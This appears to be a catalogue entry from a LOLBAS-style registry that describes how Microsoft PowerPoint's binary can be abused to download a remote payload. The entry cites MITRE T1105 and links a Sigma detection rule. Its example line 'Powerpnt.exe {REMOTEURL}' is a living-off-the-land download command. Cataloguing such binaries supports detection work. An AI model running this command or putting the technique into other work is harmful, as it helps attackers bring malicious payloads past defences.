---
id: windows-download-powerpnt
namespace: windows:download:powerpnt
name: powerpnt
description: 'Microsoft Office binary. Located at: C:\Program Files (x86)\Microsoft Office 16\ClientX86\Root\Office16\Powerpnt.exe; C:\Program Files\Microsoft Office 16\ClientX64\Root\Office16\Powerpnt.exe; C:\Program Files (x86)\Microsoft Office\Office16\Powerpnt.exe.'
author: Reegun J (OCBC Bank)
version: 1.0.0
capabilities:
- network.transfer.download
platforms:
- windows
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
- amd64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - network_traffic
  resource_cost:
    cpu: low
    memory_mb: 16
    network: medium
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: medium
  disk_io: low
allowed-tools:
- powerpnt
parameters: []
features: []
execution:
  template: powerpnt
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Downloads payload from remote server (It will download a remote payload and place it in INetCache.)
  command: Powerpnt.exe {REMOTEURL}
references:
- label: '1150032506504151040'
  url: https://twitter.com/reegun21/status/1150032506504151040
- label: unsanitized-file-validation-leads-to-malicious-pay
  url: https://medium.com/@reegun/unsanitized-file-validation-leads-to-malicious-payload-download-via-office-binaries-202d02db7191
techniques:
- exfiltration
mitre_ids:
- T1105
detections:
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_lolbin_office.yml
- type: ioc
  description: Suspicious Office application Internet/network traffic
install:
- method: choco
  package_name: powerpnt
  commands:
  - choco install powerpnt
---


# powerpnt

powerpnt is a Windows LOLBin. Microsoft Office binary. Located at: C:\Program Files (x86)\Microsoft Office 16\ClientX86\Root\Office16\Powerpnt.exe; C:\Program Files\Microsoft Office 16\ClientX64\Root\Office16\Powerpnt.exe; C:\Program Files (x86)\Microsoft Office\Office16\Powerpnt.exe.
